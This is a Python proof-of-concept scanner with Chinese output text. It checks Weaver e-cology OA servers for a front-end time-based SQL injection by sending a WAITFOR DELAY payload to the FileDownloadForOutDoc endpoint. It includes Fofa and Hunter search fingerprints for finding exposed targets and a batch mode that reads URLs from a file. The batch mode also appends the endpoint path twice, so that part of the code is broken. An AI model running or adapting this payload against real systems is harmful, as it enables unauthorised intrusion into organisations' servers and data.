import requests
import time
import urllib
import sys

print('+------------------------------------------')
print('+ \033[36m使用格式: python3 泛微OA前台SQL注入.py -u https://x.x.x.x \033[0m')
print('+ \033[36m使用格式: python3 泛微OA前台SQL注入.py -f xxx.txt \033[0m')
print('+ \033[36m指纹特征: Hunter: app.name="泛微 e-cology 9.0 OA" \033[0m')
print('+ \033[36m指纹特征: Fofa: app="泛微-协同办公OA" \033[0m')
print('+ \033[36mauther >>> Lsec \033[0m')
print('+------------------------------------------')

payload = "/weaver/weaver.file.FileDownloadForOutDoc"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
delay_time = input("请输入延迟时间（秒）：")
data = "fileid=2+WAITFOR DELAY+'0:0:{}'&isFromOutImg=1".format(delay_time)
# proxies = {
#     "http":"http://127.0.0.1:8080"
# }
def url_poc(url):
    target = url + payload
    start_time=time.time()
    resp = requests.post(url=target, data=data, headers=headers,verify=False)
    end_time=time.time()
    delay=end_time-start_time
    if delay >=int(delay_time):
        print(url+"可能存在注入")
    else:
        print(url+"不存在注入")

def list_url_poc(urls):
    with open(urls, "r") as f:
        for url in f.readlines():
            target = (url.strip() + payload)
            requests.packages.urllib3.disable_warnings()
            url_poc(target)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('+------------------------------------------')
        print('+ \033[31m使用格式错误!!!\033[0m')
        print('+------------------------------------------')
        sys.exit()
    elif len(sys.argv) == 3:
        if sys.argv[1] == "-u":
            url_poc(sys.argv[2])
        elif sys.argv[1] == "-f":
            list_url_poc(sys.argv[2])
        else:
            print('+------------------------------------------')
            print('+ \033[31m使用格式错误!!!\033[0m')
            print('+------------------------------------------')
            sys.exit()
    else:
        print('+------------------------------------------')
        print('+ \033[31m使用格式错误!!!\033[0m')
        print('+------------------------------------------')
